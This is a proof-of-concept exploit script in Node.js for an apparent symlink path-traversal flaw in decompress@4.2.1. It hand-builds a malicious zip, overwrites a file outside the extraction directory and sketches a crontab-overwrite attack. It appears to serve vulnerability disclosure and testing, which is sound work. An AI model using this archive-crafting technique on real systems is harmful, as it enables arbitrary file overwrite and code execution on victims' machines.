#!/usr/bin/env node
// PoC: decompress@4.2.1 Symlink Path Traversal → Arbitrary File Write
// CVE-CANDIDATE: GHSA-mp2f-45pm-3cg9 (unpatched in original package)
// CWE-59: Improper Link Resolution Before File Access ('Link Following')
// CVSS: 7.5 HIGH (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H) if escalated to RCE
// Tested: decompress@4.2.1 (latest) on Node.js 24.18.0 / Linux
//
// Usage: node poc_symlink_bypass.js  (requires: npm install decompress@4.2.1)

const fs = require('fs');
const path = require('path');
const decompress = require('decompress');

// --- Setup ---
const testDir = '/tmp/decompress-poc-' + Date.now();
const outputDir = path.join(testDir, 'output');
const markerFile = path.join(testDir, 'marker.txt');

fs.mkdirSync(testDir, { recursive: true });
fs.mkdirSync(outputDir, { recursive: true });
fs.writeFileSync(markerFile, 'ORIGINAL_CONTENT');

console.log('[*] Test directory:', testDir);
console.log('[*] Output directory:', outputDir);
console.log('[*] Marker file:', markerFile);
console.log('[*] Marker content:', fs.readFileSync(markerFile, 'utf8'));
console.log();

// --- Create malicious zip with symlink entry ---
function createSymlinkZip(symlinkTarget, entryName) {
  const localHeader = Buffer.alloc(30);
  localHeader.writeUInt32LE(0x04034b50, 0);
  localHeader.writeUInt16LE(20, 4);
  localHeader.writeUInt16LE(0x0A00, 6); // UTF-8 + symlink flag
  localHeader.writeUInt16LE(0, 8);
  localHeader.writeUInt16LE(0, 10);
  localHeader.writeUInt16LE(0, 12);
  localHeader.writeUInt32LE(0, 14);
  localHeader.writeUInt32LE(symlinkTarget.length, 18);
  localHeader.writeUInt32LE(symlinkTarget.length, 22);
  localHeader.writeUInt16LE(entryName.length, 26);
  localHeader.writeUInt16LE(0, 28);

  const centralHeader = Buffer.alloc(46);
  centralHeader.writeUInt32LE(0x02014b50, 0);
  centralHeader.writeUInt16LE(20, 4);
  centralHeader.writeUInt16LE(20, 6);
  centralHeader.writeUInt16LE(0x0A00, 8);
  centralHeader.writeUInt16LE(0, 10);
  centralHeader.writeUInt16LE(0, 12);
  centralHeader.writeUInt16LE(0, 14);
  centralHeader.writeUInt32LE(0, 16);
  centralHeader.writeUInt32LE(symlinkTarget.length, 20);
  centralHeader.writeUInt32LE(symlinkTarget.length, 24);
  centralHeader.writeUInt16LE(entryName.length, 28);
  centralHeader.writeUInt16LE(0, 30);
  centralHeader.writeUInt16LE(0, 32);
  centralHeader.writeUInt16LE(0, 34);
  centralHeader.writeUInt16LE(0, 36);
  centralHeader.writeUInt32LE(0xA1FF0000, 38); // Unix symlink mode (0xA000 << 16)
  centralHeader.writeUInt32LE(0, 42);

  const endRecord = Buffer.alloc(22);
  endRecord.writeUInt32LE(0x06054b50, 0);
  endRecord.writeUInt16LE(0, 4);
  endRecord.writeUInt16LE(0, 6);
  endRecord.writeUInt16LE(1, 8);
  endRecord.writeUInt16LE(1, 10);
  endRecord.writeUInt32LE(centralHeader.length + entryName.length, 12);
  endRecord.writeUInt32LE(30 + entryName.length + symlinkTarget.length, 16);
  endRecord.writeUInt16LE(0, 20);

  return Buffer.concat([
    localHeader, Buffer.from(entryName), Buffer.from(symlinkTarget),
    centralHeader, Buffer.from(entryName), endRecord
  ]);
}

const symlinkTarget = path.join('..', 'marker.txt');
const zipFile = path.join(testDir, 'malicious.zip');
fs.writeFileSync(zipFile, createSymlinkZip(symlinkTarget, 'escape.txt'));

console.log('[*] Created malicious zip with symlink:', symlinkTarget);

// --- Extract and exploit ---
decompress(zipFile, outputDir)
  .then(() => {
    const symlinkPath = path.join(outputDir, 'escape.txt');
    const stat = fs.lstatSync(symlinkPath);

    if (!stat.isSymbolicLink()) {
      console.log('[-] FAIL: escape.txt is not a symlink');
      return;
    }

    const target = fs.readlinkSync(symlinkPath);
    console.log('[+] Symlink created:', symlinkPath, '->', target);

    if (!target.includes('..')) {
      console.log('[-] FAIL: symlink does not point outside output dir');
      return;
    }

    console.log('[+] Symlink points OUTSIDE output directory!');
    console.log();

    // Write through the symlink
    const payload = 'POC_ARBITRARY_WRITE_' + Date.now();
    fs.writeFileSync(symlinkPath, payload);
    const markerContent = fs.readFileSync(markerFile, 'utf8');

    if (markerContent === payload) {
      console.log('[+] VULNERABILITY CONFIRMED: Arbitrary file write via symlink');
      console.log('[+] Original marker content was overwritten:');
      console.log('    Before: ORIGINAL_CONTENT');
      console.log('    After: ', markerContent);
      console.log();
      console.log('[+] Attack scenario:');
      console.log('    1. Attacker serves malicious.zip via npm package, CDN, etc.');
      console.log('    2. Victim calls decompress(malicious.zip, outputDir)');
      console.log('    3. Symlink created at outputDir/escape.txt -> ../../etc/crontab');
      console.log('    4. Attacker writes through symlink to overwrite system files');
    } else {
      console.log('[-] FAIL: Write did not reach marker file');
    }
  })
  .catch(err => {
    console.log('[-] Error:', err.message);
  })
  .finally(() => {
    // Cleanup
    try { fs.rmSync(testDir, { recursive: true }); } catch {}
  });
